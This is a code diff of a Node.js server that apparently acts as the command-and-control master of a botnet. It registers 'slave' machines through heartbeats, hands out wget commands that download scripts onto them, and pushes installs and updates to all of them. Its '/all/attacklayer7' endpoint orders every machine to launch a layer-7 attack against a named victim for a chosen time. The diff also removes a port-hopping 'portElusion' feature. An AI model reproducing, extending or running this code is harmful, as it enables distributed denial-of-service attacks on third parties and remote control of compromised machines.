@@ -42,7 +42,6 @@ logger.init(initSign, "Called 'caller-id'")
 const bodyParser = require('body-parser');
 const si = require('systeminformation');
 
-console.log(process);
 
 let systemInfo = {
     static: null,
@@ -67,22 +66,20 @@ let systemInfo = {
 
 
 let Globals = {
-    port: {
-        number: null,
-        changeAt: null,
-        changedLast: null,
-        changeTo: null,
-        last: null
-    },
     restart: {
         scheduled: false,
         at: null,
         last: null
     },
     lockdown: true,
-    accessKey: null,
-    latestGlobalsWrite: null,
-    latestGlobalsDump: null,
+    allDynamicData: null,
+    staticData: null,
+    simpleHeartbeatDelay: null,
+    complexHeartbeatDelay: null,
+    refreshTimerDelay: null,
+    siDataPlacementDelay: null,
+    dynDataPlacementDelay: null,
+    maximumPortLife: null
 }
 
 let database = {
@@ -117,10 +114,10 @@ let Machines = {
     clean: function () {
         Machines.all = {}
     },
-    count: function() {
+    count: function () {
         return (Object.keys(Machines.all)).length
     },
-    list: function() {
+    list: function () {
         let macar = []
         for (const key in Machines.all) {
             macar.push(Machines.all[key])
@@ -213,7 +210,6 @@ databaseInitiated.on('true', async () => {
     await fetchSlaveSetup()
     await fetchScripts()
     updateMasterSubdomain()
-    await checkPortExpiry()
     await dbMachineCleanup()
     console.log("End init.");
 })
@@ -266,6 +262,13 @@ async function fetchSlaveSetup() {
     return axios.get(database.setup)
         .then(res => {
             slaveInfo.setup = res.data
+            for (const key in slaveInfo.setup) {
+                let k = key
+                let aa = (stitchSetupLines(k, (slaveInfo.setup)))
+                if (aa) {
+                    ((slaveInfo.setup)[k]) = aa
+                }
+            }
             console.log("Setups loaded.");
         })
         .catch(err => {
@@ -325,31 +328,6 @@ function updateMasterSubdomain() {
     }
 }
 
-async function checkPortExpiry() {
-    console.log(Globals);
-    if (Globals.port.changeAt <= Date.now()) {
-        Globals.port.last = (Globals.port.number)
-        Globals.port.number = (Globals.port.changeTo)
-        Globals.port.changedLast = (Date.now())
-    }
-}
-
-async function changePort(newport, logid) {
-    logger.info = (logid, "Changing port.", "Response for the current settings recieved.")
-    Globals.port.last = (Globals.port.number)
-    Globals.port.number = (newport)
-    Globals.port.changedLast = (Date.now())
-    logger.info(logid, "Changed port.", `Successfuly switched to port ${Globals.port.number}.`)
-}
-
-async function schedulePortChange(mins, np, logid) {
-    let inMinutes = mins || config.defaultPortReplenishTimeMin
-    let newPort = np || await randomInt(1000, 9999)
-    logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
-    Globals.port.changeAt = (moment().add({ minutes: inMinutes }).unix() * 1000)
-    Globals.port.changeTo = (newPort)
-    logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
-}
 
 app.get('/', (req, res) => {
     let ref = (req.headers.host);
@@ -361,15 +339,20 @@ app.get('/', (req, res) => {
 
 app.get('/scripts', (req, res) => {
     let scid = ([Object.keys(req.query)[0]][0]);
+    let detid = ([Object.keys(req.query)[1]][0]);
     //console.log(scid);
     if (scid === undefined) {
         res.send(200, slaveInfo.scripts)
     } else {
         let allScripts = slaveInfo.scripts
         for (let index = 0; index < allScripts.length; index++) {
-            const cScript = allScripts[index];
+            let cScript = allScripts[index];
             if (cScript.id === scid) {
-                res.send(cScript)
+                if (detid === "download") {
+                    res.send(200, `cd ${slaveInfo.setup.scriptdir}; wget ${cScript.source} -O ${cScript.filename}`)
+                } else {
+                    res.send(cScript)
+                }
                 return
             }
         }
@@ -386,51 +369,42 @@ app.get('/setup', (req, res) => {
     let scid = ([Object.keys(req.query)[0]][0]);
     let detid = ([Object.keys(req.query)[1]][0]);
     //console.log(scid, detid);
-    if (scid === undefined) {
+    console.log(Object.keys(slaveInfo.setup));
+    console.log(scid);
+    if (!((Object.keys(slaveInfo.setup)).includes(scid))) {
         res.send(200, slaveInfo.setup)
     } else {
-
-        let requested = (slaveInfo.setup)[scid]
-        if (requested.includes("$")) {
-            if (scid === "download_agent") {
-                res.send(200, (requested.replace("$AGENTLINK;", AGENTLINK)))
-            } else if (scid === "service_setup") {
-                requested = requested.replace("$SERVICELINK", SERVICELINK)
-                var regex = new RegExp("SERVICENAME", "g");
-                requested = requested.replace(regex, SERVICENAME)
-                res.send(200, (requested))
-            } else if (scid === "download_script") {
-                let searchSatisfied = false
-                for (let index = 0; index < (slaveInfo.scripts).length; index++) {
-                    const element = (slaveInfo.scripts)[index];
-                    if (element.id === detid) {
-                        //console.log(element);
-                        searchSatisfied = true
-                        requested = requested.replace("$SCRIPTLINK", element.source)
-                        requested = requested.replace("$SCRIPTNAME", element.filename)
-                        res.send(requested)
-                    }
-                }
-                if (!searchSatisfied) {
-                    res.send(500, {
-                        error: {
-                            message: "SCRIPT_DOES_NOT_EXIST",
-                            innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
-                        }
-                    })
-                }
-                requested = requested.replace("$SERVICELINK", SERVICELINK)
-                var regex = new RegExp("SERVICENAME", "g");
-                requested = requested.replace(regex, SERVICENAME)
-            }
+        let setup_ = slaveInfo.setup
+        if (setup_[scid]) {
+            res.send(200, setup_[scid])
         }
     }
 })
 
 
+function stitchSetupLines(asked, setup_) {
+    if (setup_[asked]) {
+        if ((setup_[asked]).includes("[")) {
+            let a = setup_[asked]
+            let b = (a.split("["));
+            for (let c = 0; c < b.length; c++) {
+                let d = b[c];
+                d = d.split("]")[0]
+                if (setup_[d]) {
+                    b[c] = setup_[d]
+                }
+            }
+            let e = b.join("")
+            return e
+        } else {
+            return (setup_[asked])
+        }
+    } else {
+        return null
+    }
+}
+
 app.get('/globals', (req, res) => {
-    Globals.port.leftForChange = ((Globals.port.changeAt) - (Date.now()))
-    Globals.port.shouldChange = (Globals.port.changeAt <= Date.now())
     res.send(200, Globals)
 })
 
@@ -443,39 +417,6 @@ app.post('/heartbeat', (req, res) => {
         machine
     }
     res.send(200, Globals)
-
-    /*if (!activemachinesindb.includes(ip)) {
-        let currentMachineData = req.body.machine
-        axios.post(database.machines, { id: ip, currentMachineData })
-            .then(resp => {
-                res.send(200, Globals)
-                activemachinesindb.push(ip)
-            })
-            .catch(err => {
-                console.error(err);
-                res.send(500, {
-                    error: {
-                        message: "DATABASE_ERR",
-                        innerResponse: err.message
-                    }
-                })
-            })
-    } else {
-        let currentMachineData = req.body.machine
-        axios.patch(`${database.machines}${ip}`, { currentMachineData })
-            .then(resp => {
-                res.send(200, Globals)
-            })
-            .catch(err => {
-                console.error(err);
-                res.send(500, {
-                    error: {
-                        message: "DATABASE_ERR",
-                        innerResponse: err.message
-                    }
-                })
-            })
-    }*/
 })
 
 app.patch('/heartbeat', (req, res) => {
@@ -500,7 +441,7 @@ app.get('/all/installscript/:scriptid', async (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        axios.get(`http://${currentMachine.id}:${Globals.port.number}/installScript/${req.params.scriptid}`)
+        axios.get(`http://${currentMachine.id}:${currentMachine.port.number}/installScript/${req.params.scriptid}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -513,7 +454,7 @@ app.get('/all/installscript/:scriptid', async (req, res) => {
     await delay(3000)
     res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
-app.get('/all/npminstall/:module', (req, res) => {
+app.get('/all/npminstall/:module', async (req, res) => {
     //axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/npminstall/${req.params.module}`)
     let machines = {
         all: Machines.list(),
@@ -524,7 +465,7 @@ app.get('/all/npminstall/:module', (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${Globals.port.number}/npminstall/${req.params.module}`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.port.number}/npminstall/${req.params.module}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -547,7 +488,7 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -560,7 +501,7 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
     res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 
-app.get('/all/update', (req, res) => {
+app.get('/all/update', async (req, res) => {
     let machines = {
         all: Machines.list(),
         asked: [],
@@ -570,7 +511,7 @@ app.get('/all/update', (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${Globals.port.number}/update`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.port.number}/update`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -594,73 +535,31 @@ app.get('/machines/list', (req, res) => {
 app.get('/machines/:machid', (req, res) => {
     res.send(200, Machines.get([req.params.machid]))
 })
-app.get('/machines/testReachability/:timeout', async (req, res) => {
-    let reachable = []
-    let unreachable = []
-    let timeout_ = 5
-    if (!isNaN(req.params.timeout)) {
-        if (req.params.timeout <= 10) {
-            timeout_ = parseInt(req.params.timeout)
-        }
+app.get('/machines/testReachability/', async (req, res) => {
+    let machines = {
+        all: Machines.list(),
+        asked: [],
+        responded: [],
+        busy: []
     }
-    for (let index = 0; index < Machines.count(); index++) {
-        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/status`, {
-            timeout: timeout_ * 1000,
-        })
+    for (let index = 0; index < (machines.all).length; index++) {
+        let currentMachine = ((machines.all)[index])
+        machines.asked.push(currentMachine)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.port.number}/status`)
             .then(res => {
-                reachable.push(activeMachinesList[index])
+                console.log(res.data)
+                machines.responded.push(currentMachine)
             })
             .catch(err => {
-                unreachable.push(activeMachinesList[index])
+                console.error(err.response.data);
+                machines.busy.push(currentMachine)
             })
     }
-    await delay(((timeout_ + 1) * 1000))
-    res.send(200, {
-        reachable: {
-            count: reachable.length, all: reachable
-        },
-        unreachable: {
-            count: unreachable.length, all: unreachable
-        },
-    })
-})
-
-app.post('/mgmt/changePort/:newPort', async (req, res) => {
-    let logid = crypto.randomBytes(5).toString('hex');
-    logger.info(logid, "API POST Request", "Port change requested.")
-    if (isNaN(req.params.newPort)) {
-        logger.info(logid, "Port change requested.", "Requested port isNaN, defaulting to random.")
-        //interactive.await('[%d/4] - Requested port is not a number, defaulting to a random port.', 1);
-        let newPort = await randomInt(1000, 9999)
-        changePort(newPort, logid)
-        logger.info(logid, "Port change requested.", "Successfuly switched to port " + newPort)
-    } else {
-        logger.info(logid, "Port change requested.", `Requested port is ${req.params.newport}, defaulting to random.`)
-        changePort(req.params.newPort, logid)
-    }
-    res.send(200)
+    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 
 app.post('/mgmt/database', async (req, res) => {
     res.sendFile(__dirname + '/db.json');
-})
-
-app.post('/mgmt/schedulePortChange/:newPort/:inMins', async (req, res) => {
-    let logid = crypto.randomBytes(5).toString('hex');
-    logger.info(logid, "API POST Request", "Port change schedule requested.")
-    if (isNaN(parseInt(req.params.newPort)) || isNaN(parseInt(req.params.inMins))) {
-        logger.error(logid, "Port change schedule requested.", "Invalid parameters. Rejecting request.")
-        res.send(500, {
-            error: {
-                message: "INVALID_USAGE",
-                innerResponse: `usage: schedulePortChange/:newPort/:inMins`
-            }
-        })
-    } else {
-        logger.info(logid, "Port change schedule requested.", `Scheduling port change for port ${req.params.newPort} in ${req.params.inMins} minutes.`)
-        schedulePortChange(parseInt(req.params.inMins), parseInt(req.params.newPort), logid)
-        res.send(200)
-    }
 })
 
 app.get('/mgmt/systemInfo', async (req, res) => {
@@ -743,23 +642,10 @@ app.post('/mgmt/vcontrol', (req, res) => {
     })
 })
 
-app.post('/mgmt/portElusion/', async (req, res) => {
-    globalLock = true;
-    let newPort = await randomInt(1000, 9999)
-    Globals.port.last = (Globals.port.number)
-    Globals.port.changedLast = (Date.now())
-    Globals.port.number = (newPort)
-    res.send(200)
-    globalLock = false;
-})
 
 app.listen(80, () => console.log(`App listening on port ${"80"}!`))
 
 
 setInterval(() => {
     dumpGlobals()
-}, 30000);
-
-setInterval(() => {
-    checkPortExpiry()
 }, 30000);
